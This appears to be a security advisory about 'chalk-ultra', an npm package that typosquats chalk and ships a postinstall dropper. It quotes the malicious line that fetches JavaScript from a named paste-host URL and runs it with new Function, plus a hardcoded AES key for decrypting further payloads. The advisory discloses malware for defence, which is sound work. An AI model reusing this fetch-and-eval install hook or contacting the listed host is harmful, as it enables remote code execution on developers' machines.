summary: chalk-ultra: postinstall remote-code-execution dropper typosquatting chalk
details: Package is named `chalk-ultra` but its source tree is a verbatim copy of nodemailer, with no chalk functionality — the name lures developers reaching for the legitimate `chalk` package. The `postinstall` hook in package.json runs `lib/utils/index.js`, which spawns a detached Node child executing `lib/utils/smtp-connection/index.js`. That file performs `require('axios').get('https://jsonkeeper.com/b/IYUCS').then(r => new Function('require', r.data.cookie)(require))`, fetching attacker-controlled JavaScript from a mutable public paste host and passing it directly to `new Function`. This grants the publisher arbitrary remote code execution on any machine running `npm install chalk-ultra`. A co-located helper `lib/utils/smtp-connection/parse.js` provides AES-256-CBC decryption with a hardcoded key/IV (`1c7631aca0c00365e8a7e68dd11045e1d4475c909885d8dccd881f4dce9d0566`) to decode encrypted secondary payloads delivered through the same channel.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
